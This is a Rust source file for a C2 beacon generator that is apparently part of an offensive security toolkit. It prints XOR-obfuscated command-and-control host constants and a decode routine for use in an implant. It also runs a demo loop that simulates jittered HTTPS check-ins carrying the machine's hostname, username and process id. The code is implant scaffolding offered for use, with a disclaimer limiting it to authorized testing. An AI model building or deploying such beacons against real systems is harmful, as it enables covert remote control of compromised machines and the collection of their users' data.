//! Beacon Generator - C2 callback beacon with encryption
//!
//! Part of TurboNet Security Toolkit
//! For authorized security testing only

use std::env;
use std::thread;
use std::time::Duration;

fn main() {
    print_banner();

    let args: Vec<String> = env::args().collect();

    if args.len() < 2 {
        print_usage(&args[0]);
        return;
    }

    match args[1].as_str() {
        "--generate" | "-g" => {
            let host = args
                .get(2)
                .cloned()
                .unwrap_or_else(|| "127.0.0.1".to_string());
            let port = args.get(3).and_then(|p| p.parse().ok()).unwrap_or(443);
            generate_beacon(&host, port);
        }
        "--demo" | "-d" => {
            demo_beacon();
        }
        "--help" | "-h" => print_usage(&args[0]),
        _ => print_usage(&args[0]),
    }
}

fn print_banner() {
    println!(
        r#"
╔═══════════════════════════════════════════════════════════════╗
║   ██████╗ ███████╗ █████╗  ██████╗ ██████╗ ███╗   ██╗         ║
║   ██╔══██╗██╔════╝██╔══██╗██╔════╝██╔═══██╗████╗  ██║         ║
║   ██████╔╝█████╗  ███████║██║     ██║   ██║██╔██╗ ██║         ║
║   ██╔══██╗██╔══╝  ██╔══██║██║     ██║   ██║██║╚██╗██║         ║
║   ██████╔╝███████╗██║  ██║╚██████╗╚██████╔╝██║ ╚████║         ║
║   ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝         ║
║              C2 Beacon Generator v0.1                          ║
╚═══════════════════════════════════════════════════════════════╝
"#
    );
    println!("⚠  FOR AUTHORIZED SECURITY TESTING ONLY\n");
}

fn print_usage(prog: &str) {
    println!("Usage:");
    println!("  {} --generate <HOST> [PORT]   Generate beacon code", prog);
    println!(
        "  {} --demo                     Run demo beacon (localhost)",
        prog
    );
    println!();
    println!("Examples:");
    println!("  {} --generate 192.168.1.100 443", prog);
    println!("  {} --demo", prog);
}

fn generate_beacon(host: &str, port: u16) {
    println!("[*] Generating beacon configuration...\n");

    // Generate XOR key
    let key: u8 = rand::random();

    // XOR encode the host
    let encoded_host: Vec<u8> = host.bytes().map(|b| b ^ key).collect();
    let encoded_host_hex: String = encoded_host
        .iter()
        .map(|b| format!("0x{:02X}", b))
        .collect::<Vec<_>>()
        .join(", ");

    println!("╔═══════════════════════════════════════════════════════════════╗");
    println!("║  BEACON CONFIGURATION                                         ║");
    println!("╠═══════════════════════════════════════════════════════════════╣");
    println!("║  C2 Host:     {:48} ║", host);
    println!("║  C2 Port:     {:48} ║", port);
    println!(
        "║  XOR Key:     0x{:02X}                                            ║",
        key
    );
    println!("║  Protocol:    HTTPS                                           ║");
    println!("║  Jitter:      30% (±15s on 50s interval)                      ║");
    println!("╠═══════════════════════════════════════════════════════════════╣");
    println!("║  ENCODED HOST (XOR'd)                                         ║");
    println!("╚═══════════════════════════════════════════════════════════════╝");

    println!("\n// Rust beacon snippet:");
    println!("const XOR_KEY: u8 = 0x{:02X};", key);
    println!("const ENCODED_HOST: &[u8] = &[{}];", encoded_host_hex);
    println!("const C2_PORT: u16 = {};", port);
    println!();

    println!("// Decode function:");
    println!(
        r#"fn decode_host() -> String {{
    ENCODED_HOST.iter().map(|&b| (b ^ XOR_KEY) as char).collect()
}}"#
    );

    println!("\n[*] Beacon code generated");
    println!("[*] Integrate into your implant as needed");
}

fn demo_beacon() {
    println!("[*] Starting demo beacon (localhost callback)\n");
    println!("[*] This demonstrates the callback pattern without a real C2\n");

    let host = "127.0.0.1";
    let port = 8443;
    let interval = Duration::from_secs(5);
    let jitter = 0.3; // 30% jitter

    println!("╔═══════════════════════════════════════════════════════════════╗");
    println!("║  Demo Beacon Active (Ctrl+C to stop)                          ║");
    println!("╠═══════════════════════════════════════════════════════════════╣");
    println!(
        "║  Target: {}:{}                                          ║",
        host, port
    );
    println!(
        "║  Interval: {}s (±{}%)                                        ║",
        interval.as_secs(),
        (jitter * 100.0) as u32
    );
    println!("╚═══════════════════════════════════════════════════════════════╝\n");

    let mut callback_count = 0u32;

    loop {
        callback_count += 1;

        // Calculate jittered sleep
        let jitter_amount =
            (interval.as_secs_f64() * jitter * (rand::random::<f64>() - 0.5) * 2.0) as i64;
        let sleep_ms = (interval.as_millis() as i64 + jitter_amount * 1000).max(1000) as u64;

        println!(
            "[{}] Callback #{} - Simulating HTTPS POST to {}:{}...",
            chrono_time(),
            callback_count,
            host,
            port
        );

        // Simulate callback (would be real HTTP request in production)
        let payload = generate_checkin_payload();
        println!("    Payload: {} bytes (encrypted)", payload.len());
        println!("    Status: Connection refused (expected - no listener)");

        if callback_count >= 5 {
            println!("\n[*] Demo complete after 5 callbacks");
            break;
        }

        println!("    Next callback in ~{}ms\n", sleep_ms);
        thread::sleep(Duration::from_millis(sleep_ms));
    }
}

fn generate_checkin_payload() -> Vec<u8> {
    // Simulated check-in data (would contain system info in real beacon)
    let hostname = std::env::var("COMPUTERNAME").unwrap_or_else(|_| "UNKNOWN".to_string());
    let username = std::env::var("USERNAME").unwrap_or_else(|_| "UNKNOWN".to_string());

    let checkin = format!(
        r#"{{"hostname":"{}","user":"{}","pid":{},"arch":"x64","time":"{}"}}"#,
        hostname,
        username,
        std::process::id(),
        chrono_time()
    );

    // XOR "encrypt" with key
    let key = 0x55u8;
    checkin.bytes().map(|b| b ^ key).collect()
}

fn chrono_time() -> String {
    use std::time::{SystemTime, UNIX_EPOCH};
    let secs = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_secs();
    let hours = (secs / 3600) % 24;
    let mins = (secs / 60) % 60;
    let s = secs % 60;
    format!("{:02}:{:02}:{:02}", hours, mins, s)
}

// Random number generator (simple LCG for demo)
mod rand {
    use std::cell::Cell;
    use std::time::{SystemTime, UNIX_EPOCH};

    thread_local! {
        static SEED: Cell<u64> = Cell::new(
            SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_nanos() as u64
        );
    }

    pub fn random<T: RandomGen>() -> T {
        T::random()
    }

    pub trait RandomGen {
        fn random() -> Self;
    }

    impl RandomGen for u8 {
        fn random() -> Self {
            SEED.with(|s| {
                let seed = s.get().wrapping_mul(6364136223846793005).wrapping_add(1);
                s.set(seed);
                (seed >> 32) as u8
            })
        }
    }

    impl RandomGen for f64 {
        fn random() -> Self {
            SEED.with(|s| {
                let seed = s.get().wrapping_mul(6364136223846793005).wrapping_add(1);
                s.set(seed);
                (seed as f64) / (u64::MAX as f64)
            })
        }
    }
}
